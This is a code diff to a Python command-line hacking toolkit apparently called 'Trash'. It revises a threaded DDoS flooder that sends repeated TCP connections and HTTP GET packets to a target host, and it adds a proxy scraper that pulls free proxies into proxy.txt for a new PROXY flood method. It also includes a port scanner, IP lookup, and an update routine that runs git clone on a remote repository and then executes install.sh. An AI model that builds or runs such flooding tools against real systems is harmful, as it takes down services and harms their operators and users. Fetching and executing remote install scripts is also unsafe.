@@ -9,6 +9,7 @@ import platform
 import requests
 import threading
 import colorama
+import urllib.request
 from colorama import Fore, init
 init()
 
@@ -58,14 +59,22 @@ def main():
 
     if('ddos' in command.lower()):
         ddos()
-    if('portscan' in command.lower()):
+    elif('portscan' in command.lower()):
         portscan()
-    if('lookup' in command.lower()):
+    elif('lookup' in command.lower()):
         lookup()
-    if('hostip' in command.lower()):
+    elif('hostip' in command.lower()):
         hostip()
-    if('help' in command.lower()):
+    elif('update' in command.lower()):
+        update()
+    elif('scrape' in command.lower()):
+        scrape()
+    elif('help' in command.lower()):
         helpp()
+    else:
+        print(Fore.LIGHTRED_EX + "[-] Invalid command!")
+        time.sleep(1)
+        main()
 
 def ddos():
     banner()
@@ -95,12 +104,12 @@ def ddos():
             def run(self):
                 while True:
                     try:
-                        print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
                         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         packet = "GET / HTTP/1.1\n Host: " + ip + "\n\n User-Agent:" + random.choice(user_agent())
+                        print (Fore.LIGHTGREEN_EX + f"[+] Flooding {ip} @ {port}")
                         soc.connect((ip, int(portt)))
                         soc.sendto(packet, (ip, int(portt)))
-                    except socket.error:
+                    except:
                         print(Fore.LIGHTRED_EX + f"[-] Error while sending a packet! {ip} might be down!")
                         time.sleep(1)
                         pass
@@ -159,12 +168,12 @@ def portscan():
     hostt = cmd_command[1]
     host = socket.gethostbyname(hostt)
     socket.setdefaulttimeout(2)
-    print(Fore.LIGHTWHITE_EX + "\n[*] Scanning: " + hostt)
+    print(Fore.LIGHTWHITE_EX + "[*] Scanning: " + hostt)
     host=socket.gethostbyname(host)
     print ("[*] IP of host: " + host + "\n")
     ports=[1,5,7,18,20,21,22,23,25,43,42,53,80,109,110,115,118,443,194,161,445,156,137,139,3306]
     variable = 0
-    for port in (1, 65500):
+    for port in ports:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         result = sock.connect_ex((host, port))
         if result == 0:
@@ -202,13 +211,40 @@ def hostip():
     cmd_command = command.split(" ")
     host = cmd_command[1]
     iphost = socket.gethostbyname(host)
-    print(Fore.LIGHTWHITE_EX + f"\n[*] IP of {host}: {iphost}")
+    print(Fore.LIGHTWHITE_EX + f"[*] IP of {host}: {iphost}")
     input()
     main()
 
+def scrape():
+    agent = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3'
+    try:
+        req = urllib.request.Request("https://free-proxy-list.net/")       
+        req.add_header("User-Agent", agent) 
+        sourcecode = urllib.request.urlopen(req)                
+        part = str(sourcecode.read())                           
+        part = part.split("<tbody>")
+        part = part[1].split("</tbody>")
+        part = part[0].split("<tr><td>")
+        proxies = ""
+        for proxy in part:
+            proxy = proxy.split("</td><td>")
+            try:
+                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+            except:
+                pass
+        out_file = open("proxy.txt","w")
+        out_file.write("")
+        out_file.write(proxies)
+        out_file.close()
+        print(Fore.LIGHTGREEN_EX + "\n[+] Proxies downloaded successfully.")
+        time.sleep(1)
+        main()
+    except: 
+        print(Fore.LIGHTRED_EX + "[-] Error while downloading proxies!")
+
 def update():
     banner()
-    print("\nChecking for updates...")
+    print("Checking for updates...")
     os.system("git clone https://github.com/Raven141/Trash.git")
     os.system("./install.sh")
     print(Fore.LIGHTGREEN_EX + "\n[+] Trash updated to the newest version!")
@@ -217,8 +253,8 @@ def update():
 
 def helpp():
     banner()
-    print(Fore.LIGHTWHITE_EX + "\nddos - used for flooding specific host")
-    print("AVAILABLE METHODS: TCP, UDP, HTTP")
+    print(Fore.LIGHTWHITE_EX + "ddos - used for flooding specific host")
+    print("AVAILABLE METHODS: TCP, UDP, HTTP, PROXY")
     print("Usage: ddos <ip/website> <method> <power> <port>")
     print("\nportscan - used for scanning for open ports")
     print("Usage: portscan <host>")
@@ -226,6 +262,8 @@ def helpp():
     print("Usage: lookup <ip>")
     print("\nhostip - used for getting IPs of websites")
     print("Usage: hostip <ip>")
+    print("\nscrape - used for scraping proxies")
+    print("Usage: scrape")
     print("\nupdate - updates Trash to the newest version")
     print("Usage: update")
     input()
